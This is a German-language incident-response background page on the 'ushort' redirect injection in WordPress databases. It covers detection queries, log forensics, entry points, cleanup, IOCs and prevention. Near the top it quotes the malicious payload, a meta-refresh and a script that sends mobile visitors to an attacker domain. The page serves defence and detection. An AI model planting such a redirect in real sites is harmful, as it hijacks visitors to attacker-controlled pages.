# Hintergrund: die ushort-Redirect-Injektion

**Sprache:** [English](BACKGROUND.md) · Deutsch

Diese Seite beschreibt das Angriffsmuster, wie man es erkennt und nachweist, welche Einfallstore infrage kommen und welche
Indikatoren (IOCs) bekannt sind. Sie beruht auf der Analyse betroffener Installationen und auf öffentlichen Berichten.

## Das Muster

Angreifer setzen einen kurzen Redirect-Block **vor den Inhalt** von WordPress-Beiträgen, -Seiten und deren Revisionen, also an den Anfang
der Spalte `wp_posts.post_content`. Eine beobachtete Variante:

```html
<meta http-equiv="refresh" content="7; url=https://ushort.company/<ID>" /><script>(window.matchMedia("(pointer:coarse)").matches||/Android|iPhone|iPad|iPod|Mobile|Tablet|Windows Phone|webOS|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent))&&location.replace("https://ushort.company/<ID>");</script>
```

- **Mobile Besucher** (Touch-Geräte über `pointer:coarse` oder Mobile-User-Agent) werden **sofort** umgeleitet, alle anderen nach einigen Sekunden über den Meta-Refresh.
- `<ID>` ist der Pfad der Short-URL und vermutlich pro Website oder Kampagnenwelle verschieden. Auch Domain und Verzögerung können variieren.
- Direkt nach dem Block folgt ein Zeilenumbruch, danach der unveränderte Originalinhalt.
- Betroffen ist typischerweise **jeder Datensatz mit nicht leerem Inhalt**: Seiten, Beiträge, Revisionen, Page-Builder-Templates und Global Styles. Anhänge und Menüeinträge bleiben meist verschont, weil ihr Inhalt leer ist.

Weil Admins ihre Seiten meist am Desktop prüfen, bleibt die Infektion oft lange unbemerkt. Hinweise kommen dann von Kunden, die mit dem
Smartphone auf der Seite waren, oder aus der Google Search Console.

### Zusätzlich: umgebogene Home-URL

In manchen Fällen wird auch die Option `home` (seltener `siteurl`) auf die Short-URL gesetzt. Das hat drei Folgen:

- **Desktop-Besucher sehen meist trotzdem die Seite.** `redirect_canonical()` leitet bei abweichendem Host bewusst nicht um. Interne Links, Canonicals, Sitemaps und Feeds zeigen aber auf die Schad-URL.
- **Der Login kann scheitern**, weil Weiterleitungen nach dem Login, eigene Login-URLs von Security-Plugins und Admin-Links auf die falsche Home-URL zeigen.
- **Yoast SEO speichert den falschen Wert zwischen**: in der Option `wpseo` (`home_url`) und in den Permalinks der Tabelle `wp_yoast_indexable`. Auch nachdem `home` korrigiert ist, bleibt die Schad-URL dort stehen.

### Page-Builder

Elementor und andere Builder speichern das Layout in `wp_postmeta` (z. B. `_elementor_data`). Wird nur `post_content` manipuliert,
erscheint der Redirect nicht unbedingt auf jeder gerenderten Seite. Er bleibt trotzdem überall dort aktiv, wo `post_content`
ausgegeben wird, etwa in Feeds, oEmbed, Suchmaschinen-Snippets und Theme-Fallbacks. Deshalb immer die Datenbank prüfen,
nicht nur das Frontend.

## Erkennung

### In der Datenbank

```sql
-- Betroffene Datensätze nach Typ (Tabellenpräfix anpassen)
SELECT post_type, post_status, COUNT(*) FROM wp_posts
 WHERE post_content LIKE '<meta http-equiv="refresh"%' OR post_content LIKE '<script>%location.replace(%'
 GROUP BY post_type, post_status;

-- Home-URL und Site-URL
SELECT option_name, option_value FROM wp_options WHERE option_name IN ('home', 'siteurl');

-- Weitere Vorkommen einer verdächtigen Domain
SELECT COUNT(*) FROM wp_postmeta WHERE meta_value LIKE '%ushort.%';
SELECT option_name FROM wp_options WHERE option_value LIKE '%ushort.%';
```

### Wurde direkt in der Datenbank manipuliert?

Wird ein Beitrag über den Editor, die REST-API oder `wp_update_post()` geändert, setzt WordPress `post_modified` neu.
**Ist `post_modified` bei infizierten Datensätzen unverändert alt** (bei Revisionen teils Jahre), wurde der Code per direktem SQL
eingefügt, sinngemäß `UPDATE wp_posts SET post_content = CONCAT(payload, post_content)`. Das bedeutet: Der Angreifer hatte
Zugriff auf Datenbank oder Server, nicht nur auf ein WordPress-Konto.

### Im Access-Log: Zeitpunkt einer manipulierten Home-URL

WordPress ruft `wp-cron.php` mit dem User-Agent `WordPress/<version>; <home_url>` auf. Damit lässt sich nachträglich genau
eingrenzen, ab wann und bis wann die Home-URL manipuliert war:

```bash
grep -h 'POST /wp-cron.php' access*.log | grep -oE 'WordPress/[^"]+' | sort | uniq -c
```

Taucht dort eine fremde Domain auf, markiert der erste Eintrag mit dieser Domain das Zeitfenster der Manipulation. Lassen sich
in diesem Fenster keine verdächtigen HTTP-Requests auf die Website finden, kam die Änderung von außerhalb von WordPress,
etwa per SQL, FTP oder SSH oder über eine andere Installation auf demselben Server.

### Weitere Spuren im Access-Log

| Muster | Bedeutung |
|---|---|
| `GET /?wp_scrape_key=…&wp_scrape_nonce=…` | Jemand hat eine PHP-Datei über den eingebauten Theme-/Plugin-Datei-Editor gespeichert. Prüfen, wer das war und welche Datei geändert wurde. Der User-Agent nennt die Installation, aus der der Request kam. |
| `POST /` mit User-Agent `…; class-udrpc.php` ohne Versionsangabe | UpdraftCentral-Befehle, wie sie bei Missbrauch gestohlener Schlüssel beobachtet wurden ([Nethemba](https://nethemba.com/updraftcentral-backdoor-analysis/)) |
| `admin-ajax.php?action=updraft_central_ajaxcallback` von unbekannten IPs | Versuche über die UpdraftCentral-Schnittstelle |
| Aufrufe unbekannter Dateien unter `/wp-content/plugins/<zufallsname>/` | Test, ob ein hochgeladenes Backdoor-Plugin erreichbar ist |
| `POST /wp-json/batch/v1` in Serien | Verbreitete Scanner. Antworten mit Status 207 bedeuten nur, dass die Sammelanfrage verarbeitet wurde, nicht dass etwas geändert wurde. |

## Mögliche Einfallstore

Ein direktes SQL-Update ohne Spur im Web-Log setzt Zugriff auf Datenbank oder Dateisystem voraus. Diese Wege kommen infrage:

1. **Eine weitere Installation im selben Hosting-Konto.** Meist teilen sich alle Websites eines Kontos einen Systembenutzer. Von einer kompromittierten (oft vergessenen) Zweitinstallation aus lassen sich dann die `wp-config.php` und damit die DB-Zugangsdaten aller anderen Seiten lesen.
2. **Kompromittierte Hosting-Zugänge**: FTP/SFTP/SSH, phpMyAdmin, Kundenmenü des Hosters, abgeflossene DB-Zugangsdaten.
3. **Code-Ausführung über eine Plugin-Lücke** mit anschließendem SQL über `$wpdb`. Dann gibt es allerdings meist auffällige Requests im Access-Log.
4. **Missbrauchte Fernverwaltung**, etwa über gestohlene UpdraftCentral-Schlüssel oder CVE-2026-10795 (siehe unten). Ein Zusammenhang mit der ushort-Kampagne ist bislang **nicht belegt**. Die öffentlichen Analysen beschreiben bei diesem Weg Backdoor-Plugins und neue Admin-Konten, keine Redirects auf fremde Domains.

Was zur Klärung hilft: FTP/SSH-, phpMyAdmin- und Panel-Logs des Hosters, die Web-Logs **aller** Installationen im Konto für das
Zeitfenster der Manipulation, die Liste der zuletzt geänderten Dateien sowie die Benutzer- und Plugin-Listen aller Installationen.

## Bereinigung

[`wordpress-ushort-redirect-cleaner.php`](../wordpress-ushort-redirect-cleaner.php), siehe [README](../README_de.md). Kurz:

1. Payload nur dort entfernen, wo er exakt am Anfang von `post_content` steht (Byte-Vergleich)
2. `home`/`siteurl` zurücksetzen, falls betroffen
3. Optional: Yoast-Daten bereinigen (`wpseo.home_url`, Indexables inklusive `permalink_hash`)
4. Optional: Revisionen löschen
5. Vorher alle Originalwerte sichern und alles in einer Transaktion ausführen

Danach Page-Builder-CSS neu erzeugen, Caches leeren, die Seite mobil prüfen und **alle Zugangsdaten rotieren**.

## Indikatoren (IOCs)

| Typ | Wert |
|---|---|
| Domains (öffentlich berichtet) | `ushort[.]company`, `ushort[.]today`, `ushort[.]observer`, `ushort[.]info`, `ushort[.]com`, `u-short[.]net`, `urshort[.]live` ([WPSecurityAnalyzer](https://x.com/riper81/status/2060164428876951828)) |
| Merkmal | `post_content` beginnt mit `<meta http-equiv="refresh" … url=<fremde Domain>` und/oder `<script>…location.replace("<fremde Domain>")…</script>` |
| Merkmal | `post_modified` bei infizierten Datensätzen unverändert |
| Merkmal | WP-Cron-User-Agent `WordPress/x.y; https://<fremde Domain>/…` im Access-Log |
| Merkmal | Option `wpseo` → `home_url` bzw. `wp_yoast_indexable.permalink` mit fremder Domain |

Laut öffentlichen Berichten tritt die Kampagne auch als Code am Ende von JavaScript-Dateien auf. Dateien sollten deshalb
zusätzlich mit einem Malware-Scanner oder per Abgleich mit den Originalpaketen geprüft werden (z. B. `wp core verify-checksums`,
`wp plugin verify-checksums --all`).

## Vorbeugung

- **Fehlgeschlagene Auto-Updates überwachen.** Plugins bleiben sonst unbemerkt auf alten Ständen.
- **Pro Website eigene Hosting-Konten oder zumindest eigene Systembenutzer und DB-Benutzer verwenden.** Nicht mehr genutzte Installationen löschen.
- **Datei-Editor deaktivieren:** `define('DISALLOW_FILE_EDIT', true);` in jeder `wp-config.php`.
- **Fernverwaltungs-Zugänge** (UpdraftCentral, ManageWP, MainWP usw.) regelmäßig prüfen und nicht mehr genutzte Schlüssel löschen.
- **Server-Logs aufbewahren** (FTP, SSH, phpMyAdmin). Ohne sie lässt sich ein DB-Eingriff außerhalb von WordPress kaum aufklären.

## Relevante Sicherheitshinweise

- **CVE-2026-10795**, UpdraftPlus ≤ 1.26.4: Umgehung der Signaturprüfung in der UpdraftCentral-RPC-Schnittstelle, führt zu Remote Code Execution. Behoben in 1.26.5. [OpenCVE](https://app.opencve.io/cve/CVE-2026-10795) · [Wordfence Intelligence](https://www.wordfence.com/threat-intel/vulnerabilities/id/e901c2a0-2477-4b9a-8483-6002419e0a2f)
- **UpdraftCentral-Schlüsselvorfall** (Oktober 2026, kein CVE): Bei TeamUpdraft wurden Verbindungsschlüssel gestohlen und für Backdoor-Installationen genutzt. Behoben durch Schlüsselwiderruf in 1.26.13. [Herstellerbericht](https://teamupdraft.com/blog/security-incident-october-2026/) · [Analyse von Nethemba](https://nethemba.com/updraftcentral-backdoor-analysis/)

---

Nils Zimmermann, [saltylemon Online-Marketing GmbH](https://www.saltylemon.de/webentwicklung/wordpress)
